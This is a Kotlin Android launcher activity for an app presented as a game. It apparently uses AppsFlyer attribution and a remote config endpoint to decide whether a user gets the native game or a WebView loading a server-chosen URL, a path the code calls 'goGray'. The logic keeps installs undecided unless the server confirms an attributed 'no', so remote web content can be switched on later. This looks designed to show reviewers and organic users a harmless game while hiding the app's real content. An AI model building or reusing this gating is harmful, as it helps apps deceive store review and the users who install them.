package com.crystalolympus.crystalolympusgame.meridian

import android.content.Intent
import android.os.Bundle
import androidx.appcompat.app.AppCompatActivity
import com.crystalolympus.crystalolympusgame.CrystalOlympusApp
import com.crystalolympus.crystalolympusgame.LoadingActivity
import com.crystalolympus.crystalolympusgame.BuildConfig
import com.crystalolympus.crystalolympusgame.ScreenFit
import com.crystalolympus.crystalolympusgame.AtlasProgress
import com.crystalolympus.crystalolympusgame.legend.Bearings
import com.crystalolympus.crystalolympusgame.legend.SurveyVerdict
import com.crystalolympus.crystalolympusgame.bearing.Journal
import com.crystalolympus.crystalolympusgame.bearing.HostRule
import com.crystalolympus.crystalolympusgame.bearing.ClientTag
import com.crystalolympus.crystalolympusgame.terrain.ConsentCard
import com.crystalolympus.crystalolympusgame.terrain.LinkDownCard
import com.crystalolympus.crystalolympusgame.terrain.MeridianView
import com.crystalolympus.crystalolympusgame.compass.SurveyClient
import com.crystalolympus.crystalolympusgame.survey.NoticeBridge
import com.crystalolympus.crystalolympusgame.survey.NoticeSetup
import com.crystalolympus.crystalolympusgame.almanac.Cartouche
import com.crystalolympus.crystalolympusgame.almanac.Cartouche.RunChannel
import com.crystalolympus.crystalolympusgame.waypoint.LinkSensor
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.cancel
import kotlinx.coroutines.channels.Channel
import kotlinx.coroutines.launch
import kotlinx.coroutines.suspendCancellableCoroutine
import kotlinx.coroutines.withTimeoutOrNull
import java.util.Locale
import kotlin.coroutines.resume

/**
 * The activity every launch passes through. It puts a branded loader up and
 * settles which half of the app the user gets while that loader is on screen.
 * Read `.cursor/rules/kotlin_launch_flow.mdc` before rearranging any branch —
 * each one is here because of something that went wrong without it.
 *
 *  UNDECIDED, meaning nothing has been decided yet:
 *    * Offline → [LinkDownCard] as the very first frame. Nothing is started and
 *      nothing is written; when the link comes back that screen sends the user
 *      through here again.
 *    * Online → start AppsFlyer, wait on attribution and the deep link, post to
 *      config, act on the reply. `ok` with a URL means STREAM, possibly by way
 *      of [ConsentCard], and then [MeridianView]. Anything else opens the game
 *      — but NATIVE is only written down when the endpoint genuinely replied
 *      *and* there was attribution behind that reply.
 *
 *  STREAM, meaning the WebView is what this install has been getting:
 *    * Offline → [LinkDownCard], carrying the URL already saved.
 *    * A stored push URL outranks everything else and goes straight to the shell.
 *    * Otherwise attribution, then config: a fresh URL wins, a stale-but-valid
 *      saved URL is the fallback, and with neither the user gets the offline
 *      screen.
 *
 *  NATIVE, meaning the game:
 *    * The game, every time. Nothing moves an install back out of NATIVE, a
 *      push URL arriving for it included.
 */
class Landfall : AppCompatActivity() {

    private lateinit var vault: Cartouche
    private lateinit var wire: LinkSensor
    private var splash: AtlasProgress? = null
    private val scope = CoroutineScope(Dispatchers.Main)

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        vault = Cartouche(applicationContext)
        wire  = LinkSensor(applicationContext)

        val pushUrl = pushUrlFrom(intent)

        // Shell still in memory: put the user back on their page and let this
        // activity disappear without ever drawing anything.
        if (pushUrl != null && vault.runChannel == RunChannel.STREAM &&
            NoticeBridge.handOver(pushUrl)
        ) {
            Journal.i(TAG, "Warm push handed to the live shell")
            finish()
            return
        }

        // A settled NATIVE install keeps the game whatever the push says. Go
        // directly to the game's loader and skip this one, so there is a single
        // loading screen rather than two back to back.
        if (vault.runChannel == RunChannel.NATIVE) {
            Journal.i(TAG, "Returning NATIVE — straight to the game loader")
            goNative()
            return
        }

        // Opened for the first time with no radio. The no-wifi screen goes up
        // immediately; there is no point animating a bar towards a decision
        // that cannot be reached.
        if (pushUrl == null &&
            vault.runChannel == RunChannel.UNDECIDED &&
            !wire.isConnected()
        ) {
            Journal.i(TAG, "First run with no link → offline first frame")
            startActivity(Intent(this, LinkDownCard::class.java))
            finish()
            return
        }

        // Park the URL for the resolver. On STREAM the shell is already the
        // app's face so it will be used; on UNDECIDED the resolver below spends
        // it. NATIVE never gets this far.
        if (pushUrl != null) {
            Journal.i(TAG, "Cold push URL received")
            vault.coldPushUrl = pushUrl
        }

        // Undecided installs get one loading screen and it belongs to the game.
        // LoadingActivity warms the game up while [LandfallDecision] resolves the
        // route underneath it, then leaves for the game, the shell or the
        // offline screen. Drawing this activity's own loader as well is what
        // used to make an organic user sit through two of them in a row.
        if (vault.runChannel == RunChannel.UNDECIDED) {
            Journal.i(TAG, "UNDECIDED → resolve inside the single game loader")
            startActivity(
                Intent(this, LoadingActivity::class.java)
                    .putExtra(LoadingActivity.EXTRA_RESOLVE_GATE, true)
                    .setFlags(Intent.FLAG_ACTIVITY_CLEAR_TASK or Intent.FLAG_ACTIVITY_NEW_TASK)
            )
            finish()
            return
        }

        // Returning STREAM user: hold the branded loader here while config is
        // asked again.
        val loader = AtlasProgress(this, indeterminate = true) { /* completion is driven by hand */ }
        splash = loader
        setContentView(loader)
        ScreenFit.apply(this)

        scope.launch { route() }
    }

    // ── State machine ───────────────────────────────────────────────────────

    private suspend fun route() {
        val forced = BuildConfig.DEBUG_FORCE_URL
        if (BuildConfig.DEBUG && forced.isNotBlank()) {
            Journal.w(TAG, "DEBUG: forcing stream URL")
            goGray(forced)
            return
        }

        val coldPush = vault.coldPushUrl
        if (!coldPush.isNullOrBlank() && HostRule.accepts(coldPush)) {
            Journal.i(TAG, "Cold push URL → STREAM directly")
            vault.coldPushUrl = null
            if (vault.runChannel == RunChannel.UNDECIDED)
                vault.runChannel = RunChannel.STREAM
            goGray(coldPush)
            return
        }

        when (vault.runChannel) {
            RunChannel.NATIVE   -> goNative()
            RunChannel.STREAM   -> handleOnlineReturn()
            RunChannel.UNDECIDED -> handleFirstLaunch()
        }
    }

    private suspend fun handleFirstLaunch() {
        if (!ensureInternet(isFirstLaunch = true)) return

        val tracker = (applicationContext as CrystalOlympusApp).trackingDispatch
        tracker.ignite(this)
        tracker.retrace(this)
        val attribution = tracker.awaitAttribution(Bearings.attributionFirstMs)

        val result = fetchConfig(attribution)
        if (result.active && !result.destination.isNullOrBlank()) {
            vault.runChannel     = RunChannel.STREAM
            vault.destinationUrl = result.destination
            vault.urlExpiresAt   = result.expiresAt
            goGray(result.destination)
        } else {
            // Nothing ever reverses a "no", so only a real one may be written:
            // the endpoint has to have replied, and it has to have replied
            // knowing this install's attribution.
            when {
                !result.answered ->
                    Journal.i(TAG, "endpoint unreachable → game, decision left open")
                attribution.isEmpty() ->
                    Journal.i(TAG, "no attribution behind the answer → game, decision left open")
                else -> {
                    vault.runChannel = RunChannel.NATIVE
                    Journal.i(TAG, "backend → NATIVE")
                }
            }
            goNative()
        }
    }

    private suspend fun handleOnlineReturn() {
        if (!ensureInternet(isFirstLaunch = false)) return

        val coldPush = vault.consumeColdPushUrl()
        if (!coldPush.isNullOrBlank() && HostRule.accepts(coldPush)) {
            goGray(coldPush)
            return
        }

        val savedUrl = if (vault.isUrlValid()) vault.destinationUrl else null

        val tracker = (applicationContext as CrystalOlympusApp).trackingDispatch
        tracker.ignite(this)
        tracker.retrace(this)
        val attribution = tracker.awaitAttribution(Bearings.attributionReturnMs)

        val result = fetchConfig(attribution)
        when {
            result.active && !result.destination.isNullOrBlank() -> {
                vault.destinationUrl = result.destination
                vault.urlExpiresAt   = result.expiresAt
                goGray(result.destination)
            }
            !savedUrl.isNullOrBlank() -> {
                goGray(savedUrl)
            }
            else -> handOver {
                startActivity(Intent(this, LinkDownCard::class.java))
                finish()
            }
        }
    }

    private suspend fun ensureInternet(isFirstLaunch: Boolean): Boolean {
        if (wire.isConnected()) return true

        // An earlier version collected `wire.connectivityFlow` and left that
        // collection running once the first `resume` had fired. Here the
        // suspended coroutine owns the Job and drops it whether it finishes or
        // is cancelled.
        val gate = Channel<Boolean>(capacity = Channel.CONFLATED)
        val watcher: Job = scope.launch {
            wire.connectivityFlow.collect { ok -> gate.trySend(ok) }
        }
        val online = try {
            withTimeoutOrNull(Bearings.connectGraceMs) {
                suspendCancellableCoroutine<Boolean> { cont ->
                    val listener = scope.launch {
                        for (v in gate) if (v) { cont.resume(true); break }
                    }
                    cont.invokeOnCancellation { listener.cancel() }
                }
            } == true
        } finally {
            watcher.cancel()
            gate.close()
        }
        if (online) return true

        val savedUrl = if (!isFirstLaunch && vault.isUrlValid()) vault.destinationUrl else null
        startActivity(
            Intent(this, LinkDownCard::class.java).apply {
                if (!savedUrl.isNullOrBlank())
                    putExtra(LinkDownCard.EXTRA_RETURN_URL, savedUrl)
            }
        )
        finish()
        return false
    }

    private suspend fun fetchConfig(attribution: Map<String, Any?>): SurveyVerdict {
        val tracker = (applicationContext as CrystalOlympusApp).trackingDispatch
        val fcmToken = NoticeSetup.obtainToken(applicationContext)

        val body = tracker.buildRequestBody(
            attributionData = attribution,
            os              = "Android",
            locale          = Locale.getDefault().toLanguageTag().replace('-', '_'),
            pushToken       = fcmToken,
            firebaseProject = Bearings.resolveAnalyticsProject()
        )
        return SurveyClient().fetchChannel(body)
    }

    // ── Navigation ──────────────────────────────────────────────────────────

    private fun handOver(go: () -> Unit) {
        val view = splash
        if (view == null) go() else view.complete { if (!isFinishing) go() }
    }

    /**
     * There is one loading screen on the native path and it is the game's
     * [LoadingActivity], whose bar reaches 100% just before MainActivity opens.
     * This method therefore leaves at once and never animates the local bar to
     * full: doing both means watching one bar finish and another restart.
     */
    private fun goNative() {
        startActivity(
            Intent(this, LoadingActivity::class.java)
                .setFlags(Intent.FLAG_ACTIVITY_CLEAR_TASK or Intent.FLAG_ACTIVITY_NEW_TASK)
        )
        finish()
    }

    private fun goGray(url: String) = handOver {
        val target = if (vault.shouldShowNotifScreen()) ConsentCard::class.java
                     else MeridianView::class.java
        val extra = if (target == ConsentCard::class.java)
            ConsentCard.EXTRA_TARGET_URL else MeridianView.EXTRA_STREAM_URL
        startActivity(
            Intent(this, target)
                .putExtra(extra, url)
                .setFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP)
        )
        finish()
    }

    // ── Helpers ─────────────────────────────────────────────────────────────

    /**
     * Pulls the tapped notification's URL out of an intent, in both shapes one
     * can turn up in.
     *
     * A data-only message goes through our own service, which builds the tap
     * intent using the extras declared below. A message carrying a
     * `notification` block does not: with the app out of the foreground the
     * Firebase SDK draws that itself, our service is never called, and the tap
     * arrives at the launcher with the `data` payload flattened into ordinary
     * string extras. Checking only our own extra names is the reason a pushed
     * link once vanished and the shell reopened on the previously saved page
     * (pitfalls #32).
     */
    private fun pushUrlFrom(intent: Intent): String? {
        val own = if (intent.getBooleanExtra(EXTRA_FROM_PUSH, false))
            intent.getStringExtra(EXTRA_PUSH_URL) else null
        val raw = intent.getStringExtra(FCM_KEY_URL) ?: intent.getStringExtra(FCM_KEY_LINK)
        return (own ?: raw)?.trim()?.takeIf { it.isNotBlank() && HostRule.accepts(it) }
    }

    override fun onNewIntent(intent: Intent) {
        super.onNewIntent(intent)
        setIntent(intent)
        val pushUrl = pushUrlFrom(intent)

        if (!pushUrl.isNullOrBlank()) {
            when (vault.runChannel) {
                RunChannel.NATIVE -> {
                    Journal.i(TAG, "Push tap while NATIVE — game stays open")
                    return
                }
                RunChannel.STREAM -> {
                    if (NoticeBridge.handOver(pushUrl)) {
                        finish()
                        return
                    }
                    val dest = vault.destinationUrl?.takeIf { vault.isUrlValid() }
                    startActivity(
                        Intent(this, MeridianView::class.java)
                            .putExtra(MeridianView.EXTRA_STREAM_URL, dest ?: pushUrl)
                            .putExtra(MeridianView.EXTRA_PUSH_URL, pushUrl)
                            .putExtra(MeridianView.EXTRA_PUSH_WARM, true)
                            .setFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP)
                    )
                    finish()
                }
                RunChannel.UNDECIDED -> vault.coldPushUrl = pushUrl
            }
        }
    }

    override fun onDestroy() { scope.cancel(); super.onDestroy() }

    /** Exposes the UA for anything that wants to record which one was sent. */
    fun currentUserAgent(): String = ClientTag.value

    companion object {
        private const val TAG = "Landfall"
        const val EXTRA_FROM_PUSH = "from_push"
        const val EXTRA_PUSH_URL  = "push_url"

        /** The payload keys, which are also what the SDK passes through unchanged. */
        private const val FCM_KEY_URL  = "url"
        private const val FCM_KEY_LINK = "link"
    }
}
